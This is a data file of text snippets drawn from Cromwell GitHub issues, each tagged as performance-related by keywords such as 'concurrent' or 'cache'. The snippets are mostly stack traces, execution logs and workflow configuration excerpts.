java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-7"" #67 prio=5 os_prio=31 tid=0x00007fb7705a3000 nid=0xaf03 waiting on condition [0x00000001330c6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:17",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:12164,concurren,concurrent,12164,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,": WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-9"" #69 prio=5 os_prio=31 tid=0x00007fb76f36d800 nid=0xb303 waiting on condition [0x000000012c1b6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-8"" #68 prio=5 os_prio=31 tid=0x00007fb76ef84000 nid=0xb103 waiting on condition [0x0000000132bf1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:17",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:11286,concurren,concurrent,11286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,": \""#gridss-2.9.4.cwl/concordantreadpairdistribution\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Optional - configuration file use to override default GRIDSS settings.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--configuration\""\n },\n \""id\"": \""#gridss-2.9.4.cwl/configuration\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Optional - use the system version of bwa instead of the in-process version packaged with GRIDSS\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--externalaligner\""\n },\n \""default\"": false,\n \""id\"": \""#gridss-2.9.4.cwl/externalaligner\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""Optional - location of GRIDSS jar\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--jar\""\n },\n \""default\"": \""/opt/gridss/gridss-2.9.4-gridss-jar-with-dependencies.jar\"",\n \""id\"": \""#gridss-2.9.4.cwl/jar\""\n },\n {\n \""type\"": \""boolean\"",\n \""doc\"": \""zero-based assembly job index (only required when performing parallel assembly across multiple computers)\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--jobindex\""\n },\n \""default\"": false,\n \""id\"": \""#gridss-2.9.4.cwl/jobindex\""\n },\n {\n \""type\"": \""boolean\"",\n \""doc\"": \""total number of assembly jobs (only required when performing parallel assembly across multiple computers). Note than an assembly jobs is required after all indexed jobs have been completed to gather the output files together.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--jobnodes\""\n },\n \""default\"": false,\n \""id\"": \""#gridss-2.9.4.cwl/jobnodes\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""size of JVM heap for assembly and variant calling.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""--jvmheap\""\n },\n \""default\"": \""$(get_max_memory_from_runtime_memory(runtime.ram))m\"",\n \""id\"": \""#gridss-2.9.4.cwl/jvmheap\""\n },\n {\n \""type\"": \""boolean\"",\n \""doc\"": \""keep intermediate files. Not recommended except for debugging due to the high disk usage.\\n\"",\n \""inputBinding",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:74289,perform,performing,74289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['perform'],['performing']
Performance,": job id: 1832; [2018-08-14 16:14:13,17] [info] BackgroundConfigAsyncJobExecutionActor [a3d3e011test.cwl:NA:1]: Status change from - to WaitingForReturnCodeFile; [2018-08-14 16:14:14,45] [info] BackgroundConfigAsyncJobExecutionActor [a3d3e011test.cwl:NA:1]: Status change from WaitingForReturnCodeFile to Done; [2018-08-14 16:14:15,67] [error] WorkflowManagerActor Workflow a3d3e011-3a0c-4203-9edb-3d65564a1d1d failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'test.cwl.not_found': No coercion defined from wom value(s) '[]' of type 'Array[Nothing]' to 'class wom.types.WomMaybePopulatedFileType$?'.; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:839); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979);",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4004:3611,concurren,concurrent,3611,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4004,1,['concurren'],['concurrent']
Performance,:+1: with existence cache removal. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1152/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232975937:20,cache,cache,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232975937,1,['cache'],['cache']
Performance,":-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = EA2DED52B795D0B2EA5091B00E8F7A88.; [2023-03-29 12:35:42,08] [info] b303ae23-e1e5-4cde-832b-70114e9efdad-EngineJobExecutionActor-expanse_figures.CBL_hom_not_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failures before completing successfully; [2023-03-29 12:35:42,13] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_assoc:-1:1-20000000025 [b303ae23expanse_figures.CBL_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 13:07:47,67] [info] BT-322 58e64982:expanse_figures.CBL_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = C3078AB9F63DD3A59655953B1975D6CF.; [2023-03-29 13:07:47,67] [info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = tru",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:2654,cache,cache,2654,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['cache'],['cache']
Performance,":0.19]; 3589858- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:659) ~[cromwell.jar:0.19]; 3589859- at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; 3589860- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19]; 3589861- at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19]; 3589862- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 3589863- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 3589864- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 3589865- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 3589866- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) ~[cromwell.jar:0.19]; 3589867- at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; 3589868- at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; 3589869- at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; 3589870- at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; 3589871- at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; 3589872- at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; 3589873:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-dispatcher-16 INFO - WorkflowActor [UUID(129f0510)]: persisting status of CollectQualityYieldMetrics:2 to Failed.; 3589874:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-disp",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:3871,concurren,concurrent,3871,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['concurren'],['concurrent']
Performance,":0.19]; at cromwell.engine.backend.sge.SgeBackend$$anonfun$execute$1.apply(SgeBackend.scala:84) ~[cromwell-0.19.jar:0.19]; at cromwell.engine.backend.sge.SgeBackend$$anonfun$execute$1.apply(SgeBackend.scala:82) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell-0.19.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell-0.19.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell-0.19.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell-0.19.jar:0.19]; ```. WDL:. ```; task RunSTARAlignment {; File fastq1; File fastq2; String sample_name; String genome_dir; String output_dir; String pipeline_path; command {; sh ${pipeline_path}/RunSTARAlignment.sh ${fastq1} ${fastq2} ${sample_name} ${genome_dir} ${output_dir}; }; output {; File genome_alignment = ""${output_dir}/alignments/${sample_name}.Aligned.sortedByCoord.out.bam""; File trans_alignment = ""${output_dir}/alignments/${sample_name}.Aligned.Aligned.toTranscriptome.out.bam""; }; runtime {; docker: ""cowmoo/cil-dev:latest""; memory: ""4G""; cpu: ""3""; zones: ""us-central1-c us-central1-a""; disks: ""/mnt/mnt1 3 SSD, /mnt/mnt2 500 HDD""; }; }. workflow smartseq_amr {; call RunSTARAlignment; }; ```. JSON:. ```; {; ""smartseq_amr.RunSTARAlignment.fastq1"": ""/cil/shed/apps/internal/RNA_utilities/SmartSeq_StarBasedPipeline/scripts/version0.2/SampleData/Mouse-A2-single_S2_L001_R1_001.fastq "",; ""smartseq_amr.RunS",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1071:4339,concurren,concurrent,4339,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1071,1,['concurren'],['concurrent']
Performance,":04:26,92] [info] WorkflowStoreActor stopped; [2018-08-27 02:04:26,93] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-08-27 02:04:26,93] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-08-27 02:04:26,93] [info] JobExecutionTokenDispenser stopped; [2018-08-27 02:04:26,93] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-08-27 02:04:26,93] [info] WorkflowLogCopyRouter stopped; [2018-08-27 02:04:26,94] [info] WorkflowManagerActor stopped; [2018-08-27 02:04:26,94] [info] WorkflowManagerActor All workflows finished; [2018-08-27 02:04:26,94] [info] Connection pools shut down; [2018-08-27 02:04:26,94] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,95] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,95] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,96] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-08-27 02:04:26,96] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,96] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-08-27 02:04:26,96] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-08-27 02:04:26,96] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,96] [info] ServiceRegistryActor stopped; [2018-08-27 02:04:26,96] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-08-27 02:04:26,96] [info] SubWorkflowStoreActor stopped; [2018-08-27 02:04:26,96] [info] DockerHashActor stopped; [2018-08-27 02:04:26,97] [info] IoProxy stopped; [2018-08-27 02:04:26,97] [info] JobStoreActor stopped; [2018-08-27 02:04:26,97] [info] CallCacheWriteActor stopped; [2018-08-27 02:04:27,00] [info] Database closed; [2018-08-27 02:04:27,00] [info] Stream materializer shut down; [2018-08-27 02:04:27,06] [info] Automatic shutdown of the async connec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039:7130,queue,queued,7130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039,1,['queue'],['queued']
Performance,":1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it o",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2767,cache,cache,2767,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['cache'],['cache']
Performance,:1.0.0-M1]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1$$anonfun$apply$5.apply(SqlJobStore.scala:69) ~[classes/:na]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1$$anonfun$apply$5.apply(SqlJobStore.scala:66) ~[classes/:na]; at scala.Option.map(Option.scala:146) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1.apply(SqlJobStore.scala:66) ~[classes/:na]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1.apply(SqlJobStore.scala:66) ~[classes/:na]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Success.map(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[akka-actor_2,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472:2558,concurren,concurrent,2558,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472,1,['concurren'],['concurrent']
Performance,:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:11348,Concurren,ConcurrentRestrictions,11348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,7,"['Concurren', 'concurren']","['ConcurrentRestrictions', 'concurrent']"
Performance,":2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""Hikari Housekeeping Timer (pool db)"" #24 daemon prio=5 os_prio=31 tid=0x00007fb76d88f000 nid=0x7503 waiting on condition [0x000000012cebb000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0623fc0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""cromwell-system-akka.io.pinned-dispatcher-7"" #23 prio=5 os_prio=31 tid=0x00007fb76b450800 nid=0x7303 runnable [0x000000012cdb8000]; java.lang.Thread.State: RUNNABLE; at sun.nio.ch.KQueueArrayWrapper.kevent0(Native Method); at sun.nio.ch.KQueueArrayWrapper.poll(KQueueArrayWrapper.java:198); at sun.nio.ch.KQueueSelectorImpl.doSelect(KQueueSelectorImpl.java:103); at sun.nio.ch.SelectorImpl.lockAndDoSe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:41758,concurren,concurrent,41758,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,:36); 	at akka.actor.FSM$class.processEvent(FSM.scala:663); 	at cromwell.engine.workflow.lifecycle.execution.EngineJobExecutionActor.akka$actor$LoggingFSM$$super$processEvent(EngineJobExecutionActor.scala:29); 	at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.execution.EngineJobExecutionActor.processEvent(EngineJobExecutionActor.scala:29); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.engine.workflow.lifecycle.execution.EngineJobExecutionActor.aroundReceive(EngineJobExecutionActor.scala:29); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: javax.sql.rowset.serial.SerialException: Invalid position in SerialClob object set; 	at javax.sql.rowset.serial.SerialClob.getSubString(SerialClob.java:269); 	at com.mysql.jdbc.PreparedStatement.setClob(PreparedStatement.java:3171); 	at com.zaxxer.hikari.proxy.PreparedStatementJavassistProxy.setClob(PreparedStatementJavassistProxy.java); 	at slick.driver.JdbcTypesComponent$JdbcTypes$ClobJdbcType.setValue(JdbcTypesComponent.scala:148); 	at slick.driver.JdbcTypesComponent$JdbcTypes$ClobJdbcType.setValue(JdbcTypesComponent.scala:146); 	at slick.jdbc.BaseResultConverter.set(JdbcResultConverter.scala:18); 	at slick.jdbc.BaseResultConverter.set(JdbcResultConverter.scala:10); 	a,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1919:1727,concurren,concurrent,1727,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1919,1,['concurren'],['concurrent']
